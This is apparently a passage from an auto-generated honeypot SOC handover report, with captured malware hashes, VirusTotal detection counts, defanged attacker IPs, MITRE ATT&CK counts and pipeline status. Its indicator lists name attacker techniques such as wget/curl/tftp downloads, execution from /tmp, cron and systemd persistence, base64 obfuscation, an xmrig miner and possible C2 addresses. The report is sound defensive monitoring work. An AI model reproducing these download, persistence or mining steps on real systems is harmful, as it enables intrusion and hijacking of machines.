| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `87.106.63[.]76` | GB | IONOS SE | **100** ⚠️ | 40 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `190.145.192[.]106` | CO | Telmex Colombia S.A. | **100** ⚠️ | 50 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `192.248.150[.]180` | GB | The Constant Company, LLC. | **100** ⚠️ | 50 |
| `80.94.95[.]118` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `178.89.44[.]205` | KZ | JSC Kazakhtelecom, Kostanay Affiliate | **100** ⚠️ | 0 |
| `122.155.132[.]40` | TH | CAT Telecom public company Ltd | **100** ⚠️ | 42 |
| `45.148.10[.]157` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `170.231.236[.]98` | CH | GRUPO PANAGLOBAL 15 S.A | **100** ⚠️ | 41 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 48 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 46 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 90 cases |
| Tool 34  | Credential Extractor        | ✅ 87 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 62 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (17.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 45 priority case(s) shown individually · 27 recon entry/entries in table (2 group(s) consolidating 4 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-30T03:25:35Z_
